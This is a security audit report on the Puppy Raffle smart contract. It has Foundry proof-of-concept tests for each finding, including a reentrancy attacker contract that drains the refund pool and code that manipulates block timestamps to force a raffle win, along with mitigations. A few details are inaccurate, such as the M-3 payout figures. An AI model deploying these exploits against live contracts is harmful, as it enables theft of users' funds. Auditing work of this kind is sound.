# 4 puppy raffle audit - Findings Report
## Commit hash: 15c50ec22382bb1f3106aba660e7c590df18dcac

## Protocol Overview 

### 🐶 Puppy Raffle Protocol

Puppy Raffle is an on-chain game where users buy **raffle tickets** to win a randomly generated *Puppy* ERC-721 NFT and the pot’s ether.

1. **Entering**  
   • `enterRaffle(address[] participants)` is called with the entrance fee (`msg.value = fee × addresses`).  
   • The contract checks that each address is unique and stores them in `players`.  

2. **Refunds**  
   Any player may exit before a draw with `refund(index)`, receiving their ticket price back and being removed from `players`.

3. **Raffle Cycle**  
   Each round lasts `raffleDuration` seconds from `raffleStartTime`.  
   When the period elapses, anyone can call `selectWinner()` which:  
   • Pseudo-randomly selects a player.  
   • Mints a Puppy NFT with on-chain rarity/URI data.  
   • Splits the ether pot: `feeAddress` receives a protocol fee, the winner gets the remainder.

4. **Administration**  
   The owner (deployer) can update the fee recipient via `changeFeeAddress` and withdraw accumulated fees with `withdrawFees()`.

Security is aided by duplicate-entry checks, OpenZeppelin ERC-721 inheritance, and comprehensive Foundry tests. The contract targets Solidity 0.7.6 and is intended for Ethereum mainnet deployment.
## High Risk Findings
[H-1]. Timestamp Dependent Logic issue in PuppyRaffle::selectWinner
[H-2]. Reentrancy issue in PuppyRaffle::refund
[H-3]. Randomness issue in PuppyRaffle::selectWinner
[H-4]. Integer Overflow/Math issue in PuppyRaffle::selectWinner
## Medium Risk Findings
[M-1]. Gas Grief BlockLimit issue in PuppyRaffle::enterRaffle
[M-2]. Integer Overflow issue in PuppyRaffle::selectWinner
[M-3]. Integer Overflow/Math issue in PuppyRaffle::selectWinner
[M-4]. DOS issue in PuppyRaffle::enterRaffle
[M-5]. Unexpected Eth issue in PuppyRaffle::withdrawFees
## Info Risk Findings
[I-1]. Event Consistency issue in PuppyRaffle::selectWinner, withdrawFees
[I-2]. Pragma issue in PuppyRaffle::NA


### Number of Findings
- H: 4
- M: 5
- L: 0
- I: 2



# High Risk Findings

## [H-1]. Timestamp Dependent Logic issue in PuppyRaffle::selectWinner

## Description
The `selectWinner` function uses `block.timestamp` and `block.difficulty` as sources of randomness to determine the winner and the NFT's rarity. These values are predictable and can be influenced by miners. A malicious miner can compute the outcome of the raffle in advance and choose to only mine a block (and call `selectWinner`) if they are selected as the winner. This fundamentally breaks the fairness of the raffle.

## Impact
Because msg.sender is part of the random seed, whoever calls selectWinner() can completely pre-compute the outcome off-chain. By entering the raffle with N distinct addresses and only calling selectWinner from the one that makes itself the winner (or, if a miner, by slightly shifting the timestamp), an attacker can deterministically win the 80 % prize pool and the NFT, breaking the core fairness guarantee of the raffle.

## Proof of Concept
1. The attacker buys several tickets (distinct addresses) and notes their indices inside the `players` array.
2. Once the raffle period has finished, the attacker locally computes
   `winnerIdx = uint256(keccak256(abi.encodePacked(attackerAddress, block.timestamp, block.difficulty))) % players.length` for every address it controls and for a handful of candidate timestamps (±15 s is allowed by the consensus rules).
3. The attacker picks the combination (address, timestamp) that makes `winnerIdx` point to the same address in `players`.
4. They broadcast the `selectWinner()` transaction with the chosen `msg.sender` and, if a miner, with the chosen timestamp. The contract will inevitably choose the attacker as the winner and transfer the whole prize pool to them.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.7.6;
import "forge-std/Test.sol";
import "src/PuppyRaffle.sol";

contract PredictableRandomnessTest is Test {
    PuppyRaffle raffle;

    uint256 constant ENTRANCE_FEE = 1 ether;
    uint256 constant RAFFLE_DURATION = 1 days;
    address feeAddr = address(0xFEE);

    function setUp() public {
        raffle = new PuppyRaffle(ENTRANCE_FEE, feeAddr, RAFFLE_DURATION);
    }

    function _enter(address p) internal {
        address[] memory a = new address[](1);
        a[0] = p;
        vm.prank(p);
        raffle.enterRaffle{value: ENTRANCE_FEE}(a);
    }

    function test_attackerAlwaysWins() public {
        // 3 honest players
        address p1 = address(0x1);
        address p2 = address(0x2);
        address p3 = address(0x3);
        // attacker
        address attacker = address(0xA11CE);

        _enter(p1);
        _enter(p2);
        _enter(p3);
        _enter(attacker); // attacker is players[3]

        // raffle finished
        vm.warp(block.timestamp + RAFFLE_DURATION + 1);

        // attacker searches for a timestamp within the allowed 15-second window
        for (uint256 i; i < 15; i++) {
            uint256 idx = uint256(
                keccak256(
                    abi.encodePacked(attacker, block.timestamp, block.difficulty)
                )
            ) % 4; // 4 total players

            if (idx == 3) { // attacker wins
                vm.prank(attacker);
                raffle.selectWinner();
                assertEq(raffle.previousWinner(), attacker);
                return;
            }
            vm.warp(block.timestamp + 1);
        }
        fail("attacker could not align timestamp – test failed");
    }
}

## Suggested Mitigation
Remove any user-controlled values (msg.sender, timestamp, difficulty) from the randomness source and instead rely on an unpredictable oracle such as Chainlink VRF, or implement a commit-reveal / beacon based random number generator.

## [H-2]. Reentrancy issue in PuppyRaffle::refund

## Description
The `refund` function sends Ether to a user before updating the player's state (i.e., setting their address in the `players` array to `address(0)`). This follows the insecure "checks-effects-interactions" pattern where the external call (`sendValue`) is made before the state change (`players[playerIndex] = address(0)`). A malicious contract can exploit this by implementing a `receive()` function that calls back into the `refund` function for the same `playerIndex`. Because the state has not yet been updated, the second call will also pass all checks, resulting in a second refund for the same entry. This can be repeated to drain all Ether from the contract contributed by other players.

## Impact
An attacker can steal all the funds in the contract that were deposited by other players as entrance fees. This leads to a complete loss of the prize pool and a failure of the raffle's economic model.

## Proof of Concept
1. An attacker deploys a malicious contract.
2. Several legitimate users and the attacker's contract enter the raffle, funding the contract with their entrance fees.
3. The attacker calls the `refund` function, specifying the index of their entry.
4. The `PuppyRaffle` contract sends the refund amount to the attacker's contract.
5. The attacker's contract's `receive()` function is triggered, which immediately calls the `PuppyRaffle.refund()` function again for the same index.
6. Since the `players` array has not been updated yet, the re-entrant call succeeds, and another refund is sent.
7. This process repeats until the `PuppyRaffle` contract's balance is drained.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract ReentrancyAttacker {
    PuppyRaffle public immutable raffle;
    uint256 public immutable fee;
    uint256 public idx;
    uint256 public refunds;

    constructor(PuppyRaffle _raffle, uint256 _idx) payable {
        raffle = _raffle;
        fee    = _raffle.entranceFee();
        idx    = _idx;
    }

    // pay our own ticket
    function join() external payable {
        address[] memory arr = new address[](1);
        arr[0] = address(this);
        raffle.enterRaffle{value: msg.value}(arr);
    }

    function attack() external {
        raffle.refund(idx);
    }

    receive() external payable {
        refunds += 1;
        if (address(raffle).balance >= fee) {
            raffle.refund(idx);
        }
    }
}

contract RefundReentrancyTest is Test {
    uint256 constant FEE      = 1 ether;
    uint256 constant DURATION = 10;
    address  constant FEE_ACC = address(123);

    PuppyRaffle raffle;
    ReentrancyAttacker attacker;

    function setUp() public {
        raffle = new PuppyRaffle(FEE, FEE_ACC, DURATION);

        // two honest players
        address p1 = makeAddr("p1");
        address p2 = makeAddr("p2");

        vm.deal(p1, FEE);
        vm.prank(p1);
        raffle.enterRaffle{value: FEE}(one(p1));

        vm.deal(p2, FEE);
        vm.prank(p2);
        raffle.enterRaffle{value: FEE}(one(p2));

        // attacker joins so we know its index == 2
        attacker = new ReentrancyAttacker(raffle, 2);
        vm.deal(address(attacker), FEE);
        attacker.join{value: FEE}();
    }

    function test_ReentrancyDrainsPool() public {
        assertEq(address(raffle).balance, 3 * FEE);
        attacker.attack();
        assertEq(address(raffle).balance, 0, "raffle drained");
        assertEq(address(attacker).balance, 3 * FEE, "attacker profited");
        assertEq(attacker.refunds(), 3, "three refunds executed");
    }

    // helper
    function one(address a) internal pure returns (address[] memory arr) {
        arr = new address[](1);
        arr[0] = a;
    }
}

## Suggested Mitigation
Move the state-changing line `players[playerIndex] = address(0);` before transferring ether *and* inherit from `ReentrancyGuard` (OpenZeppelin) so that any other external function that might be added in the future cannot be exploited through cross-function re-entrancy.

```solidity
function refund(uint256 playerIndex) public nonReentrant {
    address player = players[playerIndex];
    require(player == msg.sender, "Only ticket owner");
    require(player != address(0), "Already refunded");

    // effects
    players[playerIndex] = address(0);

    // interaction
    Address.sendValue(payable(msg.sender), entranceFee);
    emit RaffleRefunded(player);
}
```

## [H-3]. Randomness issue in PuppyRaffle::selectWinner

## Description
The winner and NFT rarity in `selectWinner` are determined by hashing on-chain data: `keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))`. The `block.timestamp` can be manipulated by a validator within a small range, and `block.difficulty` (now `prevrandao` after The Merge) is known to the validator producing the block. A validator can repeatedly simulate the outcome of calling `selectWinner` and choose to include the transaction in a block only when the outcome is favorable to them (i.e., they win the prize). This breaks the fairness of the raffle.

## Impact
A malicious validator can guarantee that they win the raffle, stealing the entire prize pool. This completely undermines the purpose and fairness of the protocol.

## Proof of Concept
A validator (or anyone able to control the block-timestamp) can pre-compute the outcome for an arbitrary timestamp and only include the transaction when the hash makes them winner. Because the contract derives the winner from

    uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;

and all three inputs (msg.sender, timestamp, difficulty/prevrandao) are under the validator’s control or knowledge, the validator can iterate possible timestamps locally until the expression returns their index, then publish the transaction in the block using that timestamp. This guarantees they receive the whole prize pool and NFT.

## Proof of Code
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract RandomnessManipulationTest is Test {
    PuppyRaffle raffle;
    address feeAddress = address(100);
    address alice = address(1);
    address bob   = address(2);
    address carol = address(3);
    address evil  = address(4);

    uint256 constant ENTRANCE_FEE = 1 ether;
    uint256 constant RAFFLE_DURATION = 1 days;

    function setUp() public {
        raffle = new PuppyRaffle(ENTRANCE_FEE, feeAddress, RAFFLE_DURATION);

        vm.deal(alice, 10 ether);
        vm.deal(bob,   10 ether);
        vm.deal(carol, 10 ether);
        vm.deal(evil,  10 ether);

        address[] memory arr = new address[](1);

        arr[0] = alice; vm.prank(alice); raffle.enterRaffle{value: ENTRANCE_FEE}(arr);
        arr[0] = bob;   vm.prank(bob);   raffle.enterRaffle{value: ENTRANCE_FEE}(arr);
        arr[0] = carol; vm.prank(carol); raffle.enterRaffle{value: ENTRANCE_FEE}(arr);
        arr[0] = evil;  vm.prank(evil);  raffle.enterRaffle{value: ENTRANCE_FEE}(arr);

        // Finish the raffle period
        vm.warp(block.timestamp + RAFFLE_DURATION + 1);
    }

    function testEvilValidatorCanForceWin() public {
        uint256 playersLen = 4;
        uint256 ts = block.timestamp;
        // search up to 20 seconds ahead for a winning timestamp
        for (uint i; i < 20; ++i) {
            uint256 idx = uint256(keccak256(abi.encodePacked(evil, ts, block.difficulty))) % playersLen;
            if (idx == 3) { // index of evil in players array
                break;
            }
            ts += 1;
        }
        // Validator sets the block timestamp they will mine
        vm.warp(ts);
        vm.prank(evil);
        raffle.selectWinner();
        assertEq(raffle.previousWinner(), evil, "evil should be the winner");
    }
}

## Suggested Mitigation
Use a provably random source of entropy like Chainlink VRF (Verifiable Random Function). VRF provides randomness that cannot be manipulated by miners, validators, or the oracle itself.

```solidity
// Add Chainlink VRF imports and interfaces
import "@chainlink/contracts/src/v0.8/interfaces/VRFCoordinatorV2Interface.sol";
import "@chainlink/contracts/src/v0.8/vrf/VRFConsumerBaseV2.sol";

// Contract inherits from VRFConsumerBaseV2
contract PuppyRaffle is ERC721, Ownable, VRFConsumerBaseV2 {
    // ... VRF state variables (coordinator, subscriptionId, keyHash, etc.)

    function selectWinner() external {
        // ... checks ...
        // Instead of calculating winner, request randomness
        uint256 requestId = s_vrfCoordinator.requestRandomWords(
            s_keyHash,
            s_subscriptionId,
            REQUEST_CONFIRMATIONS,
            s_callbackGasLimit,
            NUM_WORDS
        );
        // Winner selection logic moves to fulfillRandomWords
    }

    function fulfillRandomWords(uint256, uint256[] memory randomWords) internal override {
        uint256 winnerIndex = randomWords[0] % players.length;
        // ... continue with winner selection logic ...
    }
}
```

## [H-4]. Integer Overflow/Math issue in PuppyRaffle::selectWinner

## Description
The `selectWinner` function has critical logic flaws related to how it handles refunded players. When a player refunds, their address is set to `address(0)` in the `players` array, but the array length is unchanged. This leads to two issues:
1. The winner selection can pick an index corresponding to `address(0)`. If this happens, the prize pool is sent to `address(0)` (effectively burned) and the NFT is minted to `address(0)` (permanently lost).
2. The `totalAmountCollected` is calculated as `players.length * entranceFee`, which incorrectly includes refunded players. This results in an inflated prize pool value that is greater than the contract's actual balance, causing the Ether transfer to the winner to fail and reverting the transaction. This can permanently stall the raffle if enough players have refunded.

## Impact
High risk of permanent loss of the entire prize pool and the winner's NFT. The raffle can also become permanently stuck, preventing a winner from ever being chosen and locking all remaining funds.

## Proof of Concept
1. Four players (A, B, C, D) enter the raffle. The contract balance is `4 * entranceFee`.
2. Player A refunds their entry. Their slot at index 0 becomes `address(0)`. The contract balance is now `3 * entranceFee`.
3. The raffle ends and `selectWinner` is called.
4. `totalAmountCollected` is calculated as `players.length (4) * entranceFee`, which is `4 * entranceFee`.
5. `prizePool` is calculated based on this incorrect, inflated amount.
6. The final transfer `winner.call{value: prizePool}()` will fail because `prizePool` is greater than the contract's balance of `3 * entranceFee`.
7. The transaction reverts, and the raffle is stuck. Any subsequent call to `selectWinner` will also fail.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract PuppyRaffleRefundBug is Test {
    PuppyRaffle raffle;
    uint256 constant ENTRANCE_FEE = 1 ether;
    uint256 constant RAFFLE_DURATION = 10;
    address constant FEE_ADDRESS = address(999);

    function setUp() public {
        raffle = new PuppyRaffle(ENTRANCE_FEE, FEE_ADDRESS, RAFFLE_DURATION);
    }

    function test_selectWinner_reverts_after_refund() public {
        // 1. 4 players join
        address[] memory arr = new address[](1);
        for (uint256 i; i < 4; i++) {
            address p = makeAddr(string(abi.encodePacked("player", i)));
            vm.deal(p, ENTRANCE_FEE);
            arr[0] = p;
            vm.prank(p);
            raffle.enterRaffle{value: ENTRANCE_FEE}(arr);
        }

        // 2. First player refunds
        vm.prank(arr[0]);
        raffle.refund(0);

        // 3. Time passes so raffle can be finished
        vm.warp(block.timestamp + RAFFLE_DURATION + 1);

        // 4. selectWinner must revert because prizePool > contract balance
        vm.expectRevert();
        raffle.selectWinner();
    }
}

## Suggested Mitigation
The contract logic must properly account for refunded players. Instead of setting the player to `address(0)`, the entry should be removed from the `players` array by swapping it with the last element and popping. This keeps the array compact and ensures `players.length` reflects the actual number of active players. Additionally, winner selection must handle the case where the chosen winner is `address(0)` by re-picking.

```diff
function refund(uint256 playerIndex) public {
    // ... checks ...
-   players[playerIndex] = address(0);
+   // Swap and pop to remove the player and keep the array compact
+   players[playerIndex] = players[players.length - 1];
+   players.pop();
    Address.sendValue(msg.sender, entranceFee);
    emit RaffleRefunded(playerAddress);
}

function selectWinner() external {
    // ...
    // With the above fix in refund, players.length is now accurate and no address(0) can be a player.
    // The logic for totalAmountCollected is now correct.
    // As an additional safeguard, if not using swap-and-pop, you must loop until a non-zero address is picked.
    // while(winner == address(0)) {
    //    winnerIndex = ...;
    //    winner = players[winnerIndex];
    // }
    // And count active players instead of using players.length.
    // uint256 activePlayers = 0;
    // for(uint i=0; i<players.length; i++) { if(players[i] != address(0)) { activePlayers++; } }
    // totalAmountCollected = activePlayers * entranceFee;
}
```



# Medium Risk Findings

## [M-1]. Gas Grief BlockLimit issue in PuppyRaffle::enterRaffle

## Description
The `enterRaffle` function contains a nested loop (`for (uint256 i = 0; ...){ for (uint256 j = i + 1; ...){...}}`) that iterates through the entire `players` array to check for duplicates. This results in a time complexity of O(n^2), where n is the number of players. As the raffle grows, the gas cost for anyone to enter increases quadratically. Eventually, the gas cost will exceed the block gas limit, making it impossible for anyone to enter the raffle and causing a Denial of Service.

## Impact
The core `enterRaffle` function can be rendered unusable, preventing new participants from joining. This stops the raffle from functioning as intended and can lock the contract in a state where no new funds can be added and a winner cannot be selected if the minimum number of players hasn't been reached.

## Proof of Concept
A single transaction that inserts a large batch of addresses makes the quadratic loop deterministicly run out of the supplied gas, demonstrating the DoS without relying on previous state.

1. Prepare an array with 600 distinct addresses.
2. Send the transaction with an explicit 5 000 000 gas limit (well below the amount required by the O(n²) loop but above the ~250 000 gas a normal insert would cost).
3. The call reverts because the duplicate-check consumes all provided gas.

An attacker can grief any user by front-running his `enterRaffle` call with the same array and `gas: 5_000_000`, ensuring the victim’s call will also fail until the block gas-limit is raised.

## Proof of Code
pragma solidity 0.7.6;

import "forge-std/Test.sol";
import "src/PuppyRaffle.sol";

contract GasGriefTest is Test {
    PuppyRaffle raffle;
    uint256 constant FEE = 1 ether;
    uint256 constant DURATION = 1 days;
    address constant FEE_ADDR = address(0x1);

    function setUp() public {
        raffle = new PuppyRaffle(FEE, FEE_ADDR, DURATION);
    }

    function testGasExhaustionSingleCall() public {
        uint256 n = 600; // big enough to blow 5M gas in the n^2 loop
        address[] memory entrants = new address[](n);
        for (uint256 i; i < n; i++) {
            entrants[i] = address(uint160(i + 1));
        }

        // Expect revert due to running out of the supplied 5M gas
        vm.expectRevert();
        raffle.enterRaffle{value: FEE * n, gas: 5_000_000}(entrants);
    }
}

## Suggested Mitigation
Replace the duplicate check with an O(1) mapping:

mapping(address => bool) public hasEntered;

function enterRaffle(address[] calldata newPlayers) external payable {
    require(msg.value == entranceFee * newPlayers.length, "wrong ETH");
    for (uint256 i; i < newPlayers.length; i++) {
        address p = newPlayers[i];
        require(!hasEntered[p], "duplicate");
        players.push(p);
        hasEntered[p] = true;
    }
    emit RaffleEnter(newPlayers);
}

// IMPORTANT: clear mapping when a player leaves or a round ends
function refund(uint256 idx) external { … hasEntered[msg.sender] = false; }
function _resetRaffle() internal {
    for (uint256 i; i < players.length; i++) {
        hasEntered[players[i]] = false;
    }
    delete players;
}

Call `_resetRaffle()` inside `selectWinner()` after the prize distribution to avoid permanently blocking past participants.

## [M-2]. Integer Overflow issue in PuppyRaffle::selectWinner

## Description
In the `selectWinner` function, the `fee` (`uint256`) is downcast to `uint64` before being added to `totalFees`. If `fee` exceeds `type(uint64).max`, its value will be truncated, leading to an incorrect and smaller amount being added to `totalFees`. Furthermore, `totalFees` itself is a `uint64` and can overflow over many raffle cycles, causing it to wrap around and leading to a significant loss of accumulated fees for the protocol owner.

## Impact
The protocol owner will lose fee revenue. The truncated or overflowed fees remain locked in the contract balance, as the `withdrawFees` function relies on the `totalFees` variable to determine the withdrawable amount. This leads to both a loss of revenue and permanently locked ETH.

## Proof of Concept
1. A raffle is set up where the total prize pool is large enough for the 20% fee to exceed `type(uint64).max` (approx `1.84e19`). For an entrance fee of 1 ETH, this requires about 93 players (`93 * 1e18 * 0.20 > 1.84e19`).
2. `selectWinner` is called. The `fee` is calculated correctly as a `uint256`.
3. The line `totalFees = totalFees + uint64(fee);` truncates the `fee` value.
4. The `totalFees` state variable now holds a much smaller value than the actual fees collected. These funds cannot be withdrawn by the owner.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract FeeOverflowTest is Test {
    function test_FeeDowncastTruncates() public {
        uint256 entranceFee = 1 ether;
        PuppyRaffle raffle = new PuppyRaffle(entranceFee, address(0xBEEF), 1 days);

        /*
         *  Make 100 different players enter the raffle in a single call.
         *  The test contract pays for everyone so we don't have to give every
         *  address ETH with `vm.deal`.
         */
        uint256 numPlayers = 100; // => total pot 100 ether, fee 20 ether
        address[] memory players = new address[](numPlayers);
        for (uint256 i; i < numPlayers; i++) {
            players[i] = address(uint160(i + 1));
        }
        raffle.enterRaffle{value: numPlayers * entranceFee}(players);

        // move time forward so `selectWinner` can be called
        vm.warp(block.timestamp + 2 days);
        raffle.selectWinner();

        // 20% of 100 ether = 20 ether ( > 2**64-1 wei ≈ 18.446 ether)
        uint256 expectedFee = 20 ether;
        uint256 storedFee   = raffle.totalFees();

        // reproduce the silent truncation that happens in the contract
        uint256 truncated   = expectedFee & uint256(type(uint64).max);

        assertEq(storedFee, truncated, "fee should be truncated to 64 bits");
        assertLt(storedFee, expectedFee, "truncation must decrease the value");

        // Owner cannot withdraw the full fee anymore
        vm.expectRevert();
        raffle.withdrawFees();
    }
}

## Suggested Mitigation
The `totalFees` variable should be a `uint256` to prevent overflow and avoid unsafe downcasting. Use safe math operations for accumulation.

```solidity
// In contract state
// uint64 public totalFees;
uint256 public totalFees;

// In selectWinner function
// totalFees = totalFees + uint64(fee);
// Using Solidity >= 0.8.0, a simple addition is safe.
// For < 0.8.0, use SafeMath.
// totalFees = totalFees.add(fee);
totalFees = totalFees + fee;

// In withdrawFees function
// require(address(this).balance == uint256(totalFees), ...)
require(address(this).balance == totalFees, ...)
```

## [M-3]. Integer Overflow/Math issue in PuppyRaffle::selectWinner

## Description
In the `selectWinner` function, the prize pool and fee calculations use integer division, which truncates any remainder. The calculation `prizePool = (totalAmountCollected * 80) / 100` and `fee = (totalAmountCollected * 20) / 100` can result in `prizePool + fee < totalAmountCollected`. The residual wei from this rounding error are not sent to anyone and remain locked in the contract after each raffle.

## Impact
Because `prizePool + fee < totalAmountCollected`, a remainder is left in the contract. After the first raffle `address(this).balance` becomes `totalFees + remainder`. The equality check `require(address(this).balance == totalFees)` inside `withdrawFees()` will therefore revert forever, preventing the owner from ever retrieving the accumulated fees. Consequently 100 % of fee revenue, not just the dust, is permanently locked.

## Proof of Concept
1. Deploy PuppyRaffle with `entranceFee = 99 wei`.
2. Call `enterRaffle` with 4 distinct addresses paying 396 wei in total.
3. Advance time and call `selectWinner()`. The function sends 79 wei to the winner, records 79 wei as `totalFees`, and leaves 1 wei dust.
4. Contract balance is now 80 wei while `totalFees == 79`.
5. The owner calls `withdrawFees()`. The call reverts because `address(this).balance != totalFees`.
6. Future raffles add more fees, but the inequality persists, so no fees can ever be withdrawn.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import "forge-std/Test.sol";
import "src/PuppyRaffle.sol";

contract PrecisionLossLocksAllFees is Test {
    PuppyRaffle raffle;
    address feeAddr = address(0xFEE);

    function setUp() public {
        raffle = new PuppyRaffle(99 wei, feeAddr, 1 days);
    }

    function test_FeeWithdrawalStuck() public {
        // prepare 4 unique players
        address[] memory players = new address[](4);
        for (uint256 i = 0; i < 4; i++) {
            players[i] = address(uint160(i + 1));
        }
        vm.deal(players[0], 1 ether);
        vm.prank(players[0]);
        raffle.enterRaffle{value: 396 wei}(players);

        // end raffle
        vm.warp(block.timestamp + 2 days);
        raffle.selectWinner();

        uint256 contractBal = address(raffle).balance;
        uint256 fees = raffle.totalFees();
        assertEq(contractBal, fees + 1); // 1 wei dust present

        vm.expectRevert("PuppyRaffle: There are currently players active!");
        raffle.withdrawFees(); // reverts because balance != totalFees
    }
}


## Suggested Mitigation
In `selectWinner()` compute the fee first and let the prize pool be the remainder:

```
uint256 fee = (totalAmountCollected * 20) / 100; // rounds down safely
uint256 prizePool = totalAmountCollected - fee;  // uses the full balance
```

This guarantees `prizePool + fee == totalAmountCollected`, eliminates dust, and keeps `address(this).balance` equal to `totalFees`, allowing the owner to withdraw fees successfully.

## [M-4]. DOS issue in PuppyRaffle::enterRaffle

## Description
The `enterRaffle` function contains a nested loop that checks for duplicate players. The complexity of this check is O(n^2), where n is the number of players. An attacker can add a large number of players to the raffle over time. Subsequent calls to `enterRaffle` will become progressively more expensive. Eventually, the gas cost of the duplicate check can exceed the block gas limit, making it impossible for anyone to enter the raffle. This constitutes a Denial of Service attack that halts the primary function of the contract.

## Impact
The `enterRaffle` function can be rendered permanently unusable, preventing any new players from joining the raffle. This would effectively freeze the contract and lock any funds already deposited until the raffle duration ends.

## Proof of Concept
1. An attacker calls `enterRaffle` multiple times with single, unique addresses, gradually increasing the size of the `players` array to a few thousand.
2. The gas cost for the O(n^2) duplicate check inside `enterRaffle` grows quadratically with each new player.
3. Once the player count is high enough, any new call to `enterRaffle`, whether from a legitimate user or the attacker, will require more gas than the block gas limit allows.
4. All subsequent `enterRaffle` transactions will fail, and no one can enter the raffle anymore.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import {Test, console2} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract PuppyRaffleGasTest is Test {
    PuppyRaffle internal raffle;
    uint256 internal constant ENTRANCE_FEE = 1 ether;
    uint256 internal constant RAFFLE_DURATION = 10;
    address internal constant FEE_ADDRESS = address(1337);

    function setUp() public {
        raffle = new PuppyRaffle(ENTRANCE_FEE, FEE_ADDRESS, RAFFLE_DURATION);
    }

    function _enter(address player) internal {
        vm.deal(player, ENTRANCE_FEE);
        address[] memory arr = new address[](1);
        arr[0] = player;
        vm.prank(player);
        raffle.enterRaffle{value: ENTRANCE_FEE}(arr);
    }

    function test_GasGrowsQuadratically() public {
        // populate with 100 players
        for (uint256 i; i < 100; i++) {
            _enter(address(uint160(i + 1)));
        }

        // measure gas cost at ~100 players
        address p101 = address(0x101);
        vm.deal(p101, ENTRANCE_FEE);
        address[] memory arr1 = new address[](1);
        arr1[0] = p101;
        vm.prank(p101);
        uint256 gasBefore = gasleft();
        raffle.enterRaffle{value: ENTRANCE_FEE}(arr1);
        uint256 gasAfter = gasleft();
        uint256 gasWith100 = gasBefore - gasAfter;

        // add another 100 players (total ~=200)
        for (uint256 i = 0x102; i < 0x1C7; i++) {
            _enter(address(uint160(i)));
        }

        // measure gas cost at ~200 players
        address pLast = address(0x1C8);
        vm.deal(pLast, ENTRANCE_FEE);
        address[] memory arr2 = new address[](1);
        arr2[0] = pLast;
        vm.prank(pLast);
        gasBefore = gasleft();
        raffle.enterRaffle{value: ENTRANCE_FEE}(arr2);
        gasAfter = gasleft();
        uint256 gasWith200 = gasBefore - gasAfter;

        console2.log("gas @100 players", gasWith100);
        console2.log("gas @200 players", gasWith200);

        // quadratic growth → roughly 4x for doubling players
        assertGt(gasWith200, gasWith100 * 3);
    }
}

## Suggested Mitigation
The duplicate check should be performed more efficiently. Instead of an O(n^2) loop, use a mapping to track existing players for an O(1) lookup. The check should also happen *before* adding players to the array.

```diff
contract PuppyRaffle is ERC721, Ownable {
    // ...
+   mapping(address => bool) private _isActivePlayer;

    function enterRaffle(address[] memory newPlayers) public payable {
        require(
            msg.value == entranceFee * newPlayers.length,
            "PuppyRaffle: Must send enough to enter raffle"
        );
        for (uint256 i = 0; i < newPlayers.length; i++) {
+           require(!_isActivePlayer[newPlayers[i]], "PuppyRaffle: Duplicate player");
            players.push(newPlayers[i]);
+           _isActivePlayer[newPlayers[i]] = true;
        }

-       // O(n^2) check is removed
-       for (uint256 i_scope_0 = 0; i_scope_0 < players.length - 1; i_scope_0++) {
-           for (uint256 j = i_scope_0 + 1; j < players.length; j++) {
-               require(players[i_scope_0] != players[j], "PuppyRaffle: Duplicate player");
-           }
-       }
        emit RaffleEnter(newPlayers);
    }

    // Remember to update the mapping in refund() and when resetting the raffle.
}
```

## [M-5]. Unexpected Eth issue in PuppyRaffle::withdrawFees

## Description
The `withdrawFees` function requires that the contract's entire balance is equal to the `totalFees` accumulated (`require(address(this).balance == uint256(totalFees))`). This logic is brittle because Ether can be sent to the contract address via a direct transfer or by a `selfdestruct` from another contract. If the contract receives any extra Ether, its balance will become greater than `totalFees`, and the `require` statement will fail permanently. This will lock all legitimately collected fees in the contract forever.

## Impact
All collected fees can be permanently locked in the contract by anyone who sends a small amount of ETH to the contract address. This results in a loss of revenue for the protocol owner.

## Proof of Concept
1. A raffle is completed, and fees are accumulated in `totalFees`. At this point, `address(this).balance == totalFees` and `withdrawFees` could be called successfully.
2. An attacker sends 1 wei to the `PuppyRaffle` contract address.
3. The contract's balance is now `totalFees + 1`.
4. The owner calls `withdrawFees()`. The check `require(address(this).balance == uint256(totalFees))` now fails because `totalFees + 1 != totalFees`.
5. The function will revert, and since there is no way to remove the extra wei, the fees are permanently locked.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract PuppyRaffleAuditTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 public constant ENTRANCE_FEE = 1 ether;
    uint256 public constant RAFFLE_DURATION = 10;
    address public constant FEE_ADDRESS = address(1);

    function setUp() public {
        puppyRaffle = new PuppyRaffle(ENTRANCE_FEE, FEE_ADDRESS, RAFFLE_DURATION);
    }

    function test_unexpectedEth_locksFeeWithdrawal() public {
        // 1. Run a full raffle to accumulate some fees
        address[] memory players = new address[](4);
        for(uint i=0; i < 4; i++) {
            address p_addr = makeAddr(string(abi.encodePacked("p", i)));
            vm.deal(p_addr, ENTRANCE_FEE);
            address[] memory p_single = new address[](1);
            p_single[0] = p_addr;
            vm.prank(p_addr);
            puppyRaffle.enterRaffle{value: ENTRANCE_FEE}(p_single);
        }
        vm.warp(block.timestamp + RAFFLE_DURATION + 1);
        vm.prank(makeAddr("picker"));
        puppyRaffle.selectWinner();

        uint64 fees = puppyRaffle.totalFees();
        assertTrue(fees > 0);
        assertEq(address(puppyRaffle).balance, uint256(fees));

        // 2. Attacker sends 1 wei to the contract
        (bool success, ) = address(puppyRaffle).call{value: 1}("");
        assertTrue(success);
        
        // 3. Now address(this).balance != totalFees
        assertEq(address(puppyRaffle).balance, uint256(fees) + 1);

        // 4. withdrawFees() will now permanently revert
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }
}
```

## Suggested Mitigation
The check in `withdrawFees` should be less strict. Instead of checking for equality, it should check that `players.length == 0` to ensure no raffle is active. When withdrawing, it should transfer `totalFees`, not the entire balance.

```diff
function withdrawFees() external {
-   require(
-       address(this).balance == uint256(totalFees),
